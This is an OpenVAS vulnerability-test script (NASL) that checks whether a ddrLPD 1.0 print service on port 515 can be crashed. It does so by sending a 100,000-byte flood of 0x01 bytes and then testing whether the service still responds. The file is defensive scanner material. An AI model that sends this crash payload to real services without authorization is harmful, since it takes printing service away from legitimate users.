###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ddrLPD_39904.nasl 13210 2019-01-22 09:14:04Z cfischer $
#
# ddrLPD Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100626");
  script_version("$Revision: 13210 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 10:14:04 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2010-05-05 18:44:23 +0200 (Wed, 05 May 2010)");
  script_bugtraq_id(39904);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_name("ddrLPD Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39904");
  script_xref(name:"URL", value:"http://ddr.web.id/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service2.nasl");
  script_require_ports("Services/lpd", 515);

  script_tag(name:"summary", value:"ddrLPD is prone to a remote denial-of-service vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to crash the affected application,
  denying service to legitimate users.");

  script_tag(name:"affected", value:"ddrLPD 1.0 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");

function check_lp_status(soc) {

  req = raw_string(0x01) + string("default") + raw_string(0x0A);
  send(socket:soc, data:req);
  buf = recv(socket:soc, length:1);

  if(strlen(buf) && strlen(buf) == 1 && ord(buf[0]) == 255)
    return TRUE;
  else
    return FALSE;
}

port = get_kb_item("Services/lpd");
if(!port) port = 515;
if(!get_port_state(port))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

if(!check_lp_status(soc:soc))
  exit(0);

req = crap(data:raw_string(0x01),length:100000);
send(socket:soc, data:req);
close(soc);

sleep(2);

soc1 = open_sock_tcp(port);
if(!soc1 || ! check_lp_status(soc:soc1)) {
  security_message(port:port);
  exit(0);
} else {
  close(soc1);
}

exit(0);